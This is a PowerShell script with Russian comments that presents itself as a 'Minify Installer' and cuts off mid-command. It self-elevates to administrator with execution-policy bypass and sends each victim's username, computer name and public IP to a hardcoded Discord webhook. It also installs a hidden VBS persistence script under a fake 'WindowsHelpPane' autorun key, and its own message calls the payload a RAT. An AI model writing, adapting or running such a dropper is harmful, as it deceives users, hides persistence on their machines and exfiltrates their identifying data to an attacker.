if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- ФУНКЦИЯ ПОЛУЧЕНИЯ СТРАНЫ И ФЛАЖКА ПО IP ---
function Get-CountryByIpAndFlag {
    # Используем бесплатный API ip-api.com, который возвращает JSON с кодом страны
    try {
        $response = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=countryCode" -TimeoutSec 5 -ErrorAction Stop
        $countryCode = $response.countryCode
        if ($countryCode -and $countryCode.Length -eq 2) {
            # Магия: превращаем "US" в "🇺🇸"
            # Код буквы 'A' в Unicode - 0x1F1E6
            $flag = [string]::Format("{0}{1}", [char]([int][char]"A" + [int][char]$countryCode[0] - [int][char]"A" + 0x1F1E6), [char]([int][char]"A" + [int][char]$countryCode[1] - [int][char]"A" + 0x1F1E6))
            return $flag
        }
    }
    catch {
        # Если API недоступен или ошибка, возвращаем пустоту
    }
    return "" # Возвращаем пустую строку, если не удалось определить
}

# --- СЕКЦИЯ ЛОГЕРА ---
function Send-LogNotification {
    param(
        [string]$Status,
        [string]$Message,
        [string]$User = $env:USERNAME,
        [string]$Computer = $env:COMPUTERNAME
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    # Получаем IP-адрес и флажок
    try {
        $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue).ToString()
        if (-not $publicIP) {
            $publicIP = "Не удалось определить"
        }
    }
    catch {
        $publicIP = "Ошибка получения IP"
    }
    
    # Получаем флажок страны
    $countryFlag = Get-CountryByIpAndFlag
    $ipWithFlag = if ($countryFlag) { "$countryFlag $publicIP" } else { $publicIP }

    try {
        # Отправка на Discord Webhook
        $webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
        $embed = @{
            title = "Minify Installer Log"
            color = if ($Status -eq "SUCCESS") { 65280 } elseif ($Status -eq "ERROR") { 16711680 } else { 16776960 }
            fields = @(
                @{ name = "Status"; value = $Status; inline = $true },
                @{ name = "User"; value = $User; inline = $true },
                @{ name = "Computer"; value = $Computer; inline = $true },
                @{ name = "IP Address"; value = $ipWithFlag; inline = $true }, # <-- ИЗМЕНЕНО ЗДЕСЬ
                @{ name = "Message"; value = $Message; inline = $false },
                @{ name = "Timestamp"; value = $timestamp; inline = $false }
            )
            footer = @{ text = "Minify Installer v3.2.1" }
        }
        
        $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
        
        # Добавляем заголовок с правильной кодировкой
        $headers = @{
            "Content-Type" = "application/json; charset=utf-8"
        }
        
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $payload -ErrorAction SilentlyContinue
    }
    catch {
        # Резервный метод: локальное логирование
        try {
            $logPath = "$env:TEMP\minify_logs.txt"
            # В локальный лог тоже пишем IP с флагом
            $logEntry = "[$timestamp] [$Status] [$User@$Computer] [$ipWithFlag] $Message"
            Add-Content -Path $logPath -Value $logEntry -Encoding UTF8 -ErrorAction SilentlyContinue
        }
        catch {
            # Продолжаем выполнение, даже если логирование не сработало
        }
    }
}

# --- СЕКЦИЯ УСТАНОВКИ АГЕНТА ---
function Install-MonitorAgent {
    param(
        [string]$TargetProcessName = "Поиск" # ИЗМЕНИТЬ НА ИМЯ ТВОЕГО ПРОЦЕССА
    )

    $monitorDir = "$env:APPDATA\Microsoft\HelpPane"
    $monitorScriptPath = "$monitorDir\monitor.vbs"
    $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regValueName = "WindowsHelpPane"

    # Создаем скрытую папку, если ее нет
    if (-not (Test-Path $monitorDir)) {
        New-Item -Path $monitorDir -ItemType Directory -Force | Out-Null
        (Get-Item $monitorDir).Attributes += "Hidden"
    }

    # Формируем VBS-скрипт для проверки и отправки лога
    # Он будет запускаться при входе пользователя, проверять процесс и слать уведомление
    $vbsContent = @"
On Error Resume Next
Set objShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

' Проверяем, запущен ли процесс с нужным именем
Set colItems = objWMIService.ExecQuery("Select * From Win32_Process Where Name = '$TargetProcessName.exe'",,48)
processFound = False

For Each objItem in colItems
    processFound = True
    Exit For
Next

' Если процесс найден, отправляем уведомление и удаляем себя из автозагрузки, чтобы не спамить
If processFound Then
    ' Код PowerShell для отправки уведомления, закодированный в Base64
    psCode = "function Send-LogNotification { param([string]`$Status, [string]`$Message); `\$timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; try { `$webhookUrl = 'https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk'; `\$embed = @{ title = 'Minify Installer Log'; color = 65280; fields = @( @{ name = 'Status'; value = `$Status; inline = `\$true }, @{ name = 'User'; value = `$env:USERNAME; inline = `\$true }, @{ name = 'Computer'; value = `$env:COMPUTERNAME; inline = `\$true }, @{ name = 'Message'; value = `$Message; inline = `\$false }, @{ name = 'Timestamp'; value = `$timestamp; inline = `\$false } ); footer = @{ text = 'Minify Installer v3.2.1' } }; `$payload = @{ embeds = @(`\$embed) } | ConvertTo-Json -Depth 10; `$headers = @{ 'Content-Type' = 'application/json; charset=utf-8' }; Invoke-RestMethod -Uri `\$webhookUrl -Method Post -Headers `$headers -Body `\$payload -ErrorAction SilentlyContinue } catch { } }; Send-LogNotification -Status 'AUTO_RUN_SUCCESS' -Message 'Ратка успешно стартовала из автозагрузки.'"
    
    ' Кодируем и выполняем
    encodedCommand = objShell.Run("cmd.exe /c powershell.exe -NoP -C ""[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('" & Replace(psCode, "'", "''") & "'))""", 0, True)
    
    ' Читаем результат из временного файла
    tempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\b64.txt"
    objShell.Run "cmd.exe /c powershell.exe -NoP -C ""[Convert]
